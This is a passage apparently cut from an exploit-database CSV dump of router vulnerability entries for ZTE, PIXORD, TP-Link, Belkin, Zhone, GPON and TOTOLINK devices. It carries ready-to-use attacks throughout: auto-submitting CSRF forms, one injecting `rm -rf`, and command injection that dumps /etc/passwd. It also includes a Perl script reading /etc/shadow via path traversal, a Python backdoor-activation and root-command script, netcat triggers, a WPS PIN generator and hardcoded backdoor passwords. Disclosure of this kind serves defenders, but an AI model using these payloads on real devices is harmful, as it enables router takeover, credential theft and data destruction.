Does not check cookies and credentials on POST
method so attackers could download the config
file without authentication.
Use at your own                Use at your own
risk and educational         risk and educational
purpose ONLY!                  purpose ONLY!
Disclaimer:
This or previous program is for Educational
purpose ONLY. Do not use it without permission.
The usual disclaimer applies, especially the
fact that Todor Donev is not liable for any
damages caused by direct or indirect use of the
information or functionality provided by these
programs. The author or any Internet provider
bears NO responsibility for content or misuse
of these programs or any derivatives thereof.
By using these programs you accept the fact
that any damage (dataloss, system crash,
system compromise, etc.) caused by the use
of these programs is not Todor Donev's
responsibility.
Use at your own                Use at your own
risk and educational           risk and educational
purpose ONLY!                  purpose ONLY!
/i\/i\/i\
<html>
<title>ZTE ZXHN H108N unauthenticated config download</title>
<body onload=javascript:document.ethack.submit()>
<p>ZTE ZXHN H108N  Exploiting..</p>
<form name=""ethack"" method=""POST"" action=""http://TARGET/getpage.gch?pid=101"" enctype=""multipart/form-data"">
<input type=""hidden"" name=""config"" id=""config"" value="""">
</body>
</html>"
2015-10-01,Remote,Hardware,Karn Ganeshen,PIXORD Vehicle 3G Wi-Fi Router 3GR-431P,Multiple Vulnerabilities,"# Exploit Title: [Vehicle 3G Wi-Fi Router - PIXORD - Multiple
# Date: May 01, 2015 [No response from Vendor till date]
# Discovered by: Karn Ganeshen
# Vendor Homepage: [http://www.pixord.com/en/products_show.php?show=17]
# Version: [Model Name :3GR-431P]
http://www.pixord.com/en/products_show.php?show=17
#The following line must not be removed.
# ps aux","Vulnerabilities]
[Software Version :RTA-A001_02]
[Wireless Driver Version :2.6.0.0]
*Vehicle 3G Wi-Fi Router - PIXORD *
*Device Info *
Model Name :3GR-431P
Software Version :RTA-A001_02
Wireless Driver Version :2.6.0.0
PiXORD 3GR-431P 3G Wi-Fi Router is a 3G + GPS + 802.11n (2T2R) wireless
router. It supports Internet access via 3G and receives position
information from GPS. 3GR-431P also supports two Ethernet ports for LAN
connectivity and 802.11n Wi-Fi Access Point for WLAN connectivity.
It is available to install the 3GR-431P on the transportation. The
passengers can use the laptop or smart phone via Wi-Fi to browse the
Internet on the go. The Ethernet port also can connect IP camera to provide
the real time monitoring.
Vulnerability Impact: Easy and full device compromise. Access to configured
keys, passwords, pass-phrases, accounts, etc. Ability to monitor the user /
vehicle via camera / connected devices.
*Multiple Security Vulnerabilities *
*1. OS command injection *
$ telnet 192.168.1.10
Trying 192.168.1.10...
Connected to 192.168.1.10.
Escape character is '^]'.
Vehicle 3G Wi-Fi Router
Login: admin
Password:
> ?
mobile3G
mobileGPS
model
reboot
restoredefault
version
As seen above, only few specific, functional options are available for
device management.
However, we can bypass this and dump hashes easily.
> ?;cat /etc/passwd
sh: ?: not found
admin:<password1>:0:0:Adminstrator:/:/bin/sh
support:<password2>:0:0:Adminstrator:/:/bin/sh
user:<password3>:0:0:Adminstrator:/:/bin/sh
> exit
Note that this is also applicable when a non-admin ‘user’ / ‘support’ logs
in over the Telnet.
The web application lacks strict input validation and hence vulnerable to
OS command injection attack.
*2. Configuration not secured properly / AuthZ issues *
The device has three users - admin, support, user.
Apparently, there is no separation of privileges between these 3 users,
when accessing over HTTP(S). All options are available to all three then.
This allows 'user' /'support' to access device configuration file -
RT2880_Settings.dat. Configuration backup contains b64-encoded login
passwords + clear-text WPA keys + other sensitive information.
.. …
*Sensitive information in configuration file - *
*more RT2880_Settings.dat *
Default
WebInit=1
HostName=pixord
Login=admin
Password=<admin_password_here>=
Login2=support
Password2=<support_password_here>==
Login3=user
Password3=<user_password_here>==
OperationMode=1
Platform=RT3352
<snip>
wan_pppoe_user=pppoe_user
wan_pppoe_pass=pppoe_passwd
wan_l2tp_server=l2tp_server
wan_l2tp_user=l2tp_user
wan_l2tp_pass=l2tp_passwd
<snip>
wan_pptp_server=pptp_server
wan_pptp_user=pptp_user
wan_pptp_pass=pptp_passwd
<snip>
DDNS=
DDNSAccount=<ddns_account_name_here>
DDNSPassword=<ddns_password_here>
CountryRegion=
CountryRegionABand=
CountryCode=
BssidNum=1
SSID1=PiXORD
WirelessMode=9
<snip>
WscSSID=RalinkInitialAP
WscKeyMGMT=WPA-EAP
WscConfigMethod=138
WscAuthType=1
WscEncrypType=1
WscNewKey=<wsc_key_here>
IEEE8021X=0
IEEE80211H=0
CSPeriod=6
PreAuth=0
AuthMode=WPAPSKWPA2PSK
EncrypType=TKIPAES
RekeyInterval=3600
RekeyMethod=TIME
PMKCachePeriod=10
WPAPSK1=<WPA_PSK_Key_here>
DefaultKeyID=2
Key1Type=0
Key1Str1=
Key2Type=0
Key2Str1=
Key3Type=0
Key3Str1=
Key4Type=0
Key4Str1=
WapiPskType=0
<snip>
WdsEnable=0
WdsEncrypType=NONE
WdsList=
WdsKey=
WirelessEvent=0
RADIUS_Server=0
RADIUS_Port=1812
RADIUS_Key=
RADIUS_Acct_Server=
RADIUS_Acct_Port=1813
RADIUS_Acct_Key=
<snip>
wan_3g_apn=public
wan_3g_dial=*99#
wan_3g_user=
wan_3g_pass=
<snip>
RADIUS_Key1=<radius_key_here>
<snip>
Also, as observed in point 1 above, all the users have a UID 0, i.e. root
level privileges to the device:
admin:<password1>:0:0:Adminstrator:/:/bin/sh
support:<password2>:0:0:Adminstrator:/:/bin/sh
user:<password3>:0:0:Adminstrator:/:/bin/sh
The application should ideally provide specific privileges to different
users, and enforce strict access control.
*3. Application does not secure configured passwords (HTTPS) *
Masked password(s) can be retrieved via frame source (inspect element) and
/ or intercepting request via a proxy.
The application should mask/censure (*****) the passwords, keys and any
other crucial pieces of configuration and must not pass the values in
clear-text.
*4. Program / Scripts running in an insecure manner - leaking clear-text
passwords in process information *
After logging in to the device over Telnet, we can drop in to a shell via
OS command injection attack described in point 1.
> ?;sh
sh: ?: not found
Enter 'help' for a list of built-in commands.
BusyBox v1.12.1 (2012-12-25 11:48:22 CST) built-in shell (ash)
Checking running processes reveal a system program *inadyn*, which
apparently is a service for ddns connectivity, leaking valid username and
password in clear-text.
PID USER VSZ STAT COMMAND
1 admin 1768 S init
2 admin 0 RWN [ksoftirqd/0]
<snip>
2159 admin 1096 S inadyn -u *<ddns-username_here>* -p *<ddns-password_here>*
-a *<ddns_domain_here>*
4050 admin 1768 R ps aux
The programs should be run securely without passing cli arguments and
parameter values in clear-text.
Best Regards,
Karn Ganeshen"
2013-02-08,Remote,Hardware,Juan Manuel Garcia,TP-Link TL-WR2543ND Router,Admin Panel Multiple Cross-Site Request Forgery Vulnerabilities,"source: https://www.securityfocus.com/bid/57877/info
http://www.example.com/userRpm/NasUserAdvRpm.htm?nas_admin_pwd=hacker&nas_admin_confirm_pwd=hacker&nas_admin_authority=1&nas_admin_ftp=1&Modify=1&Save=Save
http://www.example.com/userRpm/BasicSecurityRpm.htm?stat=983040&Save=Save","TP-LINK TL-WR2543ND is prone to multiple cross-site request-forgery vulnerabilities because the application fails to properly validate HTTP requests.
Exploiting these issues may allow a remote attacker to change a device's configuration and perform other unauthorized actions.
TP-LINK TL-WR2543ND 3.13.6 Build 110923 is vulnerable; other versions may also be affected."
2013-01-03,Remote,Hardware,ZhaoChunsheng,Belkin Wireless Router,Default WPS PIN Security,source: https://www.securityfocus.com/bid/57128/info,"Belkin Wireless Router is prone to a security vulnerability that may allow attackers to generate a default WPS PIN.
Successfully exploiting this issue may allow attackers to generate the default WPS PIN. This may lead to other attacks.
Belkin N900 F9K1104v1 is vulnerable; other versions may also be affected.
@author       : e.novellalorente@student.ru.nl
Original work : ZhaoChunsheng 04/07/2012
import sys
VERSION    = 0
SUBVERSION = 2
def usage():
print ""[+] WPSpin %d.%d "" % (VERSION, SUBVERSION)
print ""[*] Usage : python WPSpin.py 123456""
sys.exit(0)
def wps_pin_checksum(pin):
accum = 0
while(pin):
accum += 3 * (pin % 10)
pin /= 10
accum += pin % 10
pin /= 10
return  (10 - accum % 10) % 10
try:
if (len(sys.argv[1]) == 6):
p = int(sys.argv[1] , 16) % 10000000
print ""[+] WPS pin is : %07d%d"" % (p, wps_pin_checksum(p))
else:
usage()
except Exception:
usage()"
2015-09-04,WebApps,Hardware,Vulnerability-Lab,Zhone ADSL2+ 4P Bridge & Router (Broadcom),Multiple Vulnerabilities,"http://www.vulnerability-lab.com/get_content.php?id=1591
http://[LOCALHOST]:?/pvccfg.cgi
http://[LOCALHOST]:?/dnscfg.cgi
http://[LOCALHOST]:?/password.cgi  (In addition to text storage of sensitive information!)","Document Title:
Zhone ADSL2+ 4P Bridge & Router (Broadcom) - Multiple Vulnerabilities
References (Source):
Download: http://www.zhone.com/support/downloads/cpe/6218-I2/6218-I2_R030220_AnnexA.zip
Release Date:
2015-09-03
Vulnerability Laboratory ID (VL-ID):
1591
Common Vulnerability Scoring System:
8.8
Product & Service Introduction:
At Zhone, Bandwidth Changes Everything™ is more than just a tag line. It is our focus, our fundamental belief and philosophy in
developing carrier and enterprise-grade fiber access solutions for our customers ensuring bandwidth is never a constraint in the future!
(Copy of the Vendor Homepage: http://www.zhone.com/support/ )
Abstract Advisory Information:
An independent vulnerability laboratory researcher discovered multiple remote vulnerabilities in the official Zhone ADSL2+ 4 Port Wireless Bridge & Router (Broadcom).
Vulnerability Disclosure Timeline:
2015-09-03:Public Disclosure (Vulnerability Laboratory)
Discovery Status:
Published
Affected Product(s):
Zhone
Product: Zhone ADSL2+ 4 Port Bridge (Broadcom) & Zhone ADSL2+ 4 Port Router (Broadcom) 6218-I2-xxx - FW: 03.02.20
Exploitation Technique:
Remote
Severity Level:
High
Technical Details & Description:
An authentication bypass vulnerability has been discovered in the official in the official Zhone ADSL2+ 4 Port Wireless Bridge & Router (Broadcom).
The vulnerability allows remote attackers to bypass the authentication procedure to compromise the hardware device or service interface.
The first vulnerability is located in the session validation when processing to request via GET (outside the network) the `pvccfg.cgi`,`dnscfg.cgi`
and `password.cgi` files. Thus can results in a reconfiguration by the attacker to compromise the hardware device.
The second vulnerability is located in the backupsettings.conf file access rights. Remote attackers can easily request via curl the backupsettings
of the hardware device. Thus can result in an easy take-over of the hardware device via an information disclosure by accessing the backupsettings.conf.
The security risk of both vulnerabilities are estimated as high with a cvss (common vulnerability scoring system) count of 8.8. Exploitation of the access
privilege issue requires no privilege application user account or user interaction. Successful exploitation of the bug results in hardware device compromise.
Request Method(s):
[+] GET
Vulnerable Model(s):
[+] Zhone ADSL2+ 4 Port Bridge (Broadcom)
[+] Zhone ADSL2+ 4 Port Router (Broadcom)
Affected Firmware:
[+] 03.02.20
Product Name:
[+] 6218-I2-xxx
Proof of Concept (PoC):
The vulnerabilities can be exploited by remote attackers without privilege device user account or user interaction.
For security demonstration or to reproduce the vulnerability follow the provided information and steps below to continue.
PoC: #1
Note: The links above can be accessed without any authentication in the interface!
PoC: #2
curl ""http://<IP>/backupsettings.conf"" -H ""Authorization: Basic dXNlcjp1c2Vy"" (""dXNlcjp1c2Vy"" = ""user:user"" in base64)
Note: Obtaining backup DSL router configurations by an users account authentication!
Security Risk:
The security risk of the both vulnerabilities in the bridge and wireless router interface is estimated as high. (CVSS 8.8)
Credits & Authors:
Mahmoud Khaled - [mahmoud_khld@yahoo.com]
Disclaimer & Information:
The information provided in this advisory is provided as it is without any warranty. Vulnerability Lab disclaims all warranties, either expressed
or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-Lab or its suppliers are not liable
in any case of damage, including direct, indirect, incidental, consequential loss of business profits or special damages, even if Vulnerability-Lab
or its suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation of liability for
consequential or incidental damages so the foregoing limitation may not apply. We do not approve or encourage anybody to break any vendor licenses,
policies, deface websites, hack into databases or trade with fraud/stolen material.
Domains:    www.vulnerability-lab.com   - www.vuln-lab.com       - www.evolution-sec.com
Contact:    admin@vulnerability-lab.com - research@vulnerability-lab.com        - admin@evolution-sec.com
Section:    magazine.vulnerability-db.com- vulnerability-lab.com/contact.php       - evolution-sec.com/contact
Social:    twitter.com/#!/vuln_lab - facebook.com/VulnerabilityLab        - youtube.com/user/vulnerability0lab
Feeds:    vulnerability-lab.com/rss/rss.php- vulnerability-lab.com/rss/rss_upcoming.php   - vulnerability-lab.com/rss/rss_news.php
Programs:   vulnerability-lab.com/submit.php  - vulnerability-lab.com/list-of-bug-bounty-programs.php- vulnerability-lab.com/register/
Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability Laboratory. Permission to
electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other media, are reserved by
Vulnerability-Lab Research Team or its suppliers. All pictures, texts, advisories, source code, videos and other information on this website
is trademark of vulnerability-lab team & the specific authors or managers. To record, list (feed), modify, use or edit our material contact
(admin@vulnerability-lab.com or research@vulnerability-lab.com) to get a permission.
Copyright © 2015 | Vulnerability Laboratory - [Evolution Security GmbH]™
VULNERABILITY LABORATORY - RESEARCH TEAM
SERVICE: www.vulnerability-lab.com
CONTACT: research@vulnerability-lab.com
PGP KEY: http://www.vulnerability-lab.com/keys/admin@vulnerability-lab.com%280x198E9928%29.txt"
2015-09-02,WebApps,Hardware,Phan Thanh Duy,GPON Home Router FTP G-93RG1,Cross-Site Request Forgery / Command Execution,"# Exploit Title: GPON Home CSRF With Command ExecuteVulnerability
# Author: Phan Thanh Duy (logicaway) - KAISAI12 (ceh.vn)
# E-mail:(facebook https://www.facebook.com/duy.phanthanh.75),(
https://www.facebook.com/kai.sai.35)
# Category: Hardware
# Google Dork: N/A
# Vendor: FTP Viet Nam
# Firmware Version: 3.0.0 Build 120531
# Product: FTP G-93RG1
# Tested on: Windows 8 64-bit
#Introduction
#Description of Vulnerability
#Exploit","Execute command with CSRF
<html>
<head>
<title>CSRF Demo Exploit</title>
</head>
<body>
<form name=""auto"" method=""POST""
action=""http://192.168.1.1/GponForm/diag_XForm""
enctype=""multipart/form-data"">
<input type=""hidden"" name=""XWebPageName"" value=""diag""/>
<input type=""hidden"" name=""diag_action"" value=""ping""/>
<input type=""hidden"" name=""wan_conlist"" value=""0""/>
<input type=""hidden"" name=""dest_host"" value=""`rm -rf stuff`""/>
<input type=""hidden"" name=""ipver"" value=""0""/>
<!-- input type=""submit"" name=""submit""/> -->
</form>
<script type=""text/javascript"">
document.auto.submit();
</script>
</body>
</html>"
2012-10-29,WebApps,Hardware,Matan Azugi,TP-Link TL-WR841N Router,Local File Inclusion,"source: https://www.securityfocus.com/bid/56320/info
#TP-LINK TL-WR841N Shadow file grabber#
#built by Pulse matan () madsec co il#
#enjoy#","TP-LINK TL-WR841N router is prone to a local file-include vulnerability because it fails to sufficiently sanitize user-supplied input.
An attacker can exploit this vulnerability to view files and execute local scripts in the context of the affected device. This may aid in further attacks.
TP-LINK TL-WR841N 3.13.9 Build 120201 Rel.54965n is vulnerable; other versions may also be affected.
use LWP::UserAgent;
$host = $ARGV[0];
chomp($host);
if($host !~ /http:\/\//) { $host = ""http://$host"";; };
my $ua = LWP::UserAgent->new;
$ua->timeout(30);
$lfi = ""/help/../../../../../../../../etc/shadow"";
$url = $host.$lfi;
$request = HTTP::Request->new('GET', $url);
$response = $ua->request($request);
my $html = $response->content;
if($html =~ /root/) {
print ""root$' \n"" ;"
2015-08-15,WebApps,Hardware,MadMouse,TOTOLINK Routers,Backdoor / Remote Code Execution,"# Exploit Title: TOTOLINK backdoor and RCE exploit POC
# Google Dork: N/A
# Date: Thu Aug 13 07:33:29 MDT 2015
# Exploit Author: MadMouse
# Vendor Homepage: http://www.totolink.net/
# Software Link:
http://www.totolink.net/include/download.asp?path=down/010100&file=TOTOLINK%20A850R-V1_1.0.1_20150725.zip
# Version: A850R-V1 : until last firwmware
# Tested on: A850R-V1
# CVE : N/A
# Credit: https://pierrekim.github.io/advisories/2015-totolink-0x02.txt
#!/usr/bin/env python
# THE SCOTCH-WARE LICENSE (Revision 43):
# <aaronryool@gmail.com> wrote this file. As long as you retain this notice
# can do whatever you want with this stuff. If we meet some day, and you
# this stuff is worth it, you can buy me a shot of scotch in return","TOTOLINK-A850R-V1.0.1-B20150707.1612.web, F1-V2 : until last firmware
F1-V2.1.1-B20150708.1646.web, F2-V1 : until last firmware
F2-V2.1.0-B20150320.1611.web, N150RT-V2 : until last firmware
TOTOLINK-N150RT-V2.1.1-B20150708.1548.web, N151RT-V2 : until last firmware
TOTOLINK-N151RT-V2.1.1-B20150708.1559.web, N300RH-V2 : until last firmware
TOTOLINK-N300RH-V2.0.1-B20150708.1625.web, N300RH-V3 : until last firmware
TOTOLINK-N300RH-V3.0.0-B20150331.0858.web, N300RT-V2 : until last firmware
TOTOLINK-N300RT-V2.1.1-B20150708.1613.web
you
think
import socket, sys
if len(sys.argv) < 2:
print(""Usage: %s <ip> <command string>...\x1b[0m"" % sys.argv[0])
exit(1)
commandstr = urllib.quote_plus("" "".join(sys.argv[2:]))
def check_activate_backdoor():
try:
vulnerable = ""hel,xasf""     # this is both the check, and the
command to open the management interface to the internet
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], 5555))
s.send(vulnerable)
ret = True if s.recv(len(vulnerable)) == vulnerable else False
s.close()
except:
print(""\x1b[031mThis just happened: \x1b[037m%s\x1b[0m"" %
sys.exc_info()[0])
exit(2)
return ret
def close_backdoor():
try:
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], 5555))
s.send(""oki,xasf"")
s.close()
except:
print(""\x1b[031mThis just happened: \x1b[037m%s\x1b[0m"" %
sys.exc_info()[0])
exit(2)
return
if check_activate_backdoor():
print(""\x1b[032mThis device appears to be vulnerable\nbackdoor
activated\x1b[0m"")
try:
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], 80))
s.send(""POST /boafrm/formSysCmd
HTTP/1.1\r\n\r\nsysCmd=%s&apply=Apply&msg=\r\n\r\n"" % commandstr)
print(""\x1b[032mCommands sent\x1b[0m"")
print(""\x1b[032mResponse: \n%s\x1b[0m"" % s.recv(512))
s.close()
except:
print(""\x1b[031mThis just happened: \x1b[037m%s\x1b[0m"" %
sys.exc_info()[0])
exit(2)
close_backdoor()
exit(0)
else:
print(""\x1b[032mThis device isn't vulnerable lol\x1b[0m"")
exit(1)"
2015-07-16,WebApps,Hardware,Pierre Kim,8 TOTOLINK Router Models,Backdoor Access / Remote Code Execution,"## Advisory Information
## Product Description
## Vulnerabilities Summary
## Details - backdoor
# start web server
https://pierrekim.github.io/blog/2015-07-XX-backdoor-in-TOTOLINK-products.html
## Details - RCE in the management interface
http://ip//boafrm/formSysCmd
http://ip//boafrm/formSysCmd
## Vendor Response
## Report Timeline
## Credit
## References
https://pierrekim.github.io/advisories/2015-totolink-0x02.txt
https://pierrekim.github.io/blog/2015-07-16-backdoor-and-RCE-found-in-8-TOTOLINK-products.html
## Disclaimer","Title: Backdoor and RCE found in 8 TOTOLINK router models
Advisory URL: https://pierrekim.github.io/advisories/2015-totolink-0x02.txt
Blog URL: https://pierrekim.github.io/blog/2015-07-16-backdoor-and-RCE-found-in-8-TOTOLINK-products.html
Date published: 2015-07-16
Vendors contacted: None
Release mode: 0days, Released
CVE: no current CVE
TOTOLINK is a brother brand of ipTime which wins over 80% of SOHO
markets in South Korea.
TOTOLINK produces routers routers, wifi access points and network
devices. Their products are sold worldwide.
A backdoor is present in several TOTOLINK products.
This was confirmed by analysing the latest firmwares and by testing
the backdoor against live routers.
At least 8 TOTOLINK products are affected (firmwares come from
totolink.net and from totolink.cn):
- A850R-V1 : until last firwmware TOTOLINK-A850R-V1.0.1-B20150707.1612.web
- F1-V2 : until last firmware F1-V2.1.1-B20150708.1646.web
- F2-V1 : until last firmware F2-V2.1.0-B20150320.1611.web
- N150RT-V2 : until last firmware TOTOLINK-N150RT-V2.1.1-B20150708.1548.web
- N151RT-V2 : until last firmware TOTOLINK-N151RT-V2.1.1-B20150708.1559.web
- N300RH-V2 : until last firmware TOTOLINK-N300RH-V2.0.1-B20150708.1625.web
- N300RH-V3 : until last firmware TOTOLINK-N300RH-V3.0.0-B20150331.0858.web
- N300RT-V2 : until last firmware TOTOLINK-N300RT-V2.1.1-B20150708.1613.web
By sending a crafted request to the WAN IP, an attacker will open the
HTTP remote management interface on the Internet.
Then an attacker can use a Remote Code Execution in the HTTP remote
management interface by using the hidden /boafrm/formSysCmd form,
bypassing the authentication system.
We estimate there are =~ 50 000 routers affected by this backdoor.
The init.d script executes the /bin/skt binary when the router starts:
cat etc/init.d/rcS
boa
skt&
skt is a small MIPS binary which is a client/server program. The arguments are:
server: ./skt
client: ./skt host cmd
The binary can be used in x86_64 machines using QEMU: sudo chroot .
./qemu-mips-static ./bin/skt
Using skt without argument will launch a TCP daemon on port 5555 in
every interface (including WAN), acting as an ECHO server.
Using skt with arguments will send a TCP packet containing the command
to the specified IP on port 5555.
The analysis of the binary running on the TOTOLINK devices (for more
details, read
) shows the server mode responds to 3 commands by silently executing
system() in the background:
o By sending ""hel,xasf"" to the device, the device will execute:
iptables -I INPUT -p tcp --dport 80 -i eth1 -j ACCEPT
This will open the HTTP remote management interface on port 80 in
the eth1 interface which is the WAN interface by default.
o By sending ""oki,xasf"" to the device, the device will execute:
iptables -D INPUT -p tcp --dport 80 -i eth1 -j ACCEPT
This will close the HTTP remote management interface.
o By sending ""bye,xasf"" to the device, the device will do nothing
The iptables commands in the backdoor are hardcoded with ""eth1"".
Only devices using DHCP and static IP connections are affected because
the WAN IP is attached on the eth1 device.
It does not affect devices using PPPoE connections, because the WAN IP
is attached on the ppp device, as seen below:
totolink# ifconfig
ppp0      Link encap:Point-to-Point Protocol
inet addr:X.X.X.X  P-t-P:X.X.X.X  Mask:255.255.255.255
UP POINTOPOINT RUNNING NOARP MULTICAST  MTU:1438  Metric:1
RX packets:17308398 errors:0 dropped:0 overruns:0 frame:0
TX packets:2605290 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:64
RX bytes:2803138455 (2.6 GiB)  TX bytes:277402492 (264.5 MiB)
An attacker can use these simple netcat commands to test the backdoor:
To open the HTTP remote management interface on the Internet:
echo -ne ""hel,xasf"" | nc <ip> 5555
To close the HTTP remote management interface on the Internet:
echo -ne ""oki,xasf"" | nc <ip> 5555
To detect a vulnerable router:
echo -ne ""GET / HTTP/1.1"" | nc <ip> 5555
if you see ""GET / HTTP/1.1"" in the answer, you likely detected a
vulnerable router.
A hidden form in the latest firmware allows an attacker to execute
commands as root by sending a HTTP request:
POST /boafrm/formSysCmd HTTP/1.1
sysCmd=<cmd>&apply=Apply&msg=
An attacker can use wget to execute commands in the remote device:
wget --post-data='sysCmd=<cmd>&apply=Apply&msg='
For instance, sending this HTTP request to the management interface
will reboot the device:
POST /boafrm/formSysCmd HTTP/1.1
sysCmd=reboot&apply=Apply&msg=
This wget command will do the same job:
wget --post-data='sysCmd=reboot&apply=Apply&msg='
TOTOLINK was not contacted in regard of this case.
* Jun 25, 2015: Backdoor found by analysing TOTOLINK firmwares.
* Jun 26, 2015: Working PoCs with RCE.
* Jul 13, 2015: Updated firmwares confirmed vulnerable.
* Jul 16, 2015: A public advisory is sent to security mailing lists.
These vulnerabilities were found by Alexandre Torres and Pierre Kim
(@PierreKimSec).
This advisory is licensed under a Creative Commons Attribution Non-Commercial
Share-Alike 3.0 License: http://creativecommons.org/licenses/by-nc-sa/3.0/"
2015-07-16,WebApps,Hardware,Pierre Kim,4 TOTOLINK Router Models,Backdoor Credentials,"## Advisory Information
## Product Description
## Vulnerabilities Summary
## Details - G150R-V1 and G300R-V1
## Details - N150RH-V1 and N301RT
#start telnetd
## Vendor Response
## Report Timeline
## Credit
## References
https://pierrekim.github.io/advisories/2015-totolink-0x03.txt
## Disclaimer","Title: Backdoor credentials found in 4 TOTOLINK router models
Advisory URL: https://pierrekim.github.io/advisories/2015-totolink-0x03.txt
Blog URL: https://pierrekim.github.io/blog/2015-07-16-backdoor-credentials-found-in-4-TOTOLINK-products.html
Date published: 2015-07-16
Vendors contacted: None
Release mode: 0days, Released
CVE: no current CVE
TOTOLINK is a brother brand of ipTime which wins over 80% of SOHO
markets in South Korea.
TOTOLINK produces routers routers, wifi access points and network
devices. Their products are sold worldwide.
Backdoor credentials are present in several TOTOLINK products.
It affects 4 TOTOLINK products (firmwares come from totolink.net and
from totolink.cn):
G150R-V1 : last firmware 1.0.0-B20150330
(TOTOLINK-G150R-V1.0.0-B20150330.1734.web)
G300R-V1 : last firmware 1.0.0-B20150330
(TOTOLINK-G300R-V1.0.0-B20150330.1816.web)
N150RH-V1 : last firmware 1.0.0-B20131219
(TOTOLINK-N150RH-V1.0.0-B20131219.1014.web)
N301RT-V1 : last firmware 1.0.0 (TOTOLINK N301RT_V1.0.0.web)
It allows an attacker in the LAN to connect to the device using telnet
with 2 different accounts: root and 'onlime_r' which gives with root
privileges.
The init.d script executes these commands when the router starts:
cp /etc/passwd_orig /var/passwd
cp /etc/group_orig /var/group
telnetd&
The /etc/passwd_orig contains backdoor credentials:
root:$1$01OyWDBw$Hrxb2t.LtmiiJD49OBsCU/:0:0:root:/:/bin/sh
onlime_r:$1$01OyWDBw$Hrxb2t.LtmiiJD49OBsCU/:0:0:root:/:/bin/sh
nobody:x:0:0:nobody:/:/dev/null
The corresponding passwords are:
root:12345
onlime_r:12345
The init.d script executes these commands when the router starts:
telnetd&
The binary /bin/sysconf executes these commands when the router starts:
system(""cp /etc/passwd.org /var/passwd 2> /dev/null"")
The /etc/passwd.org contains backdoor credentials:
root:$1$01OyWDBw$Hrxb2t.LtmiiJD49OBsCU/:0:0:root:/:/bin/sh
onlime_r:$1$01OyWDBw$Hrxb2t.LtmiiJD49OBsCU/:0:0:root:/:/bin/sh
nobody:x:0:0:nobody:/:/dev/null
The corresponding passwords are:
root:12345
onlime_r:12345
TOTOLINK was not contacted in regard of this case.
* Jun 25, 2015: Backdoor found by analysing TOTOLINK firmwares.
* Jun 26, 2015: working PoCs.
* Jul 16, 2015: A public advisory is sent to security mailing lists.
These backdoor credentials were found Pierre Kim (@PierreKimSec).
This advisory is licensed under a Creative Commons Attribution Non-Commercial
Share-Alike 3.0 License: http://creativecommons.org/licenses/by-nc-sa/3.0/"
2015-07-16,WebApps,Hardware,Pierre Kim,4 TOTOLINK Router Models,Cross-Site Request Forgery / Cross-Site Scripting,"## Advisory Information
## Product Description
## Vulnerability Summary
## Details - CSRF
http://www.google.com/ for instance can be used.
http://pierrekim.github.io/advisories/2015-totolink-0x01-PoC-change_dns_csrf_bypass.html
http://pierrekim.github.io/advisories/2015-totolink-0x01-PoC-activate_admin_wan_csrf_bypass.html
## Details - stored XSS and fun
## Vendor Response
## Report Timeline
## Credit
## Greetings
## References
https://pierrekim.github.io/advisories/2015-totolink-0x01.txt
## Disclaimer","Title: 4 TOTOLINK router models vulnerable to CSRF and XSS attacks
Advisory URL: https://pierrekim.github.io/advisories/2015-totolink-0x01.txt
Blog URL: http://pierrekim.github.io/blog/2015-07-16-4-TOTOLINK-products-vulnerable-to-CSRF-and-XSS-attacks.html
Date published: 2015-07-16
Vendors contacted: None
Release mode: Released, 0day
CVE: no current CVE
TOTOLINK is a brother brand of ipTime which wins over 80% of SOHO
markets in South Korea.
TOTOLINK produces routers routers, wifi access points and network
devices. Their products are sold worldwide.
TOTOLINK iPuppy, iPuppy3, N100RE and N200RE are wireless LAN routers.
Their current firmwares with default configuration are
vulnerable to CSRF-attacks and XSS attacks.
Since, the anti-CSRF protection is based on a static HTTP referrer
(RFC 1945), an attacker can take over
most of the configuration and settings using anyone inside the LAN of
the router. Owners are urged to
contact TOTOLINK, and activate authentication on this product
(disabled by default).
It affects (firmware come from totolink.net and from totolink.cn):
TOTOLINK iPuppy : firmware 1.2.1 (TOTOLINK iPuppy__V1.2.1.update)
TOTOLINK iPuppy3 : firmware 1.0.2 (TOTOLINK iPuppy3_V1.0.2.update)
TOTOLINK N100RE-V1 : firmware V1.1-B20140723-2-432-EN
(TOTOLINK-N100RE-IP04216-RT5350-SPI-1M8M-V1.1-B20140723-2-432-EN.update)
TOTOLINK N200RE : firmware V1.4-B20140724-2-457-EN
(TOTOLINK-N200RE-IP04220-MT7620-SPI-1M8M-V1.4-B20140724-2-457-EN.update)
The HTTP interface allows to edit the configuration. This interface is
vulnerable to CSRF.
Configuration and settings can be modified with CSRF attacks:
Activate the remote control management
Change the DNS configuration
Update the firmware
Change the Wifi Configuration
Create TCP redirections to the LAN
and more...
Example of forms exploiting the CSRF:
o Activating the remote control management on port 31337/tcp listening
on the WAN interface.
<html>
<head>
<script>
function s() {
document.f.submit();
</script>
</head>
<body onload=""s()"">
<form id=""f"" name=""f"" method=""POST"" action=""http://192.168.1.1/do_cmd.htm"">
<input type=""hidden"" name=""CMD"" value=""SYS"">
<input type=""hidden"" name=""GO"" value=""firewallconf_accesslist.html"">
<input type=""hidden"" name=""nowait"" value=""1"">
<input type=""hidden"" name=""SET0"" value=""17367296=31337"">
<input type=""hidden"" name=""SET1"" value=""17236224=1"">
</form>
</body>
</html>
o Changing the DNS configuration to 0.2.0.7 and 1.2.0.1:
<html>
<head>
<script>
function s() {
document.f.submit();
</script>
</head>
<body onload=""s()"">
<form id=""f"" name=""f"" method=""POST"" action=""http://192.168.1.1/do_cmd.htm"">
<input type=""hidden"" name=""CMD"" value=""WAN"">
<input type=""hidden"" name=""GO"" value=""netconf_wansetup.html"">
<input type=""hidden"" name=""SET0"" value=""50397440=2"">
<input type=""hidden"" name=""SET1"" value=""50856960=64-E5-99-AA-AA-AA"">
<input type=""hidden"" name=""SET2"" value=""235077888=1"">
<input type=""hidden"" name=""SET3"" value=""235012865=0.2.0.7"">
<input type=""hidden"" name=""SET4"" value=""235012866=1.2.0.1"">
<input type=""hidden"" name=""SET5"" value=""51118336=0"">
<input type=""hidden"" name=""SET6"" value=""51839232=1"">
<input type=""hidden"" name=""SET7"" value=""51511552=1500"">
<input type=""hidden"" name=""SET8"" value=""117834240="">
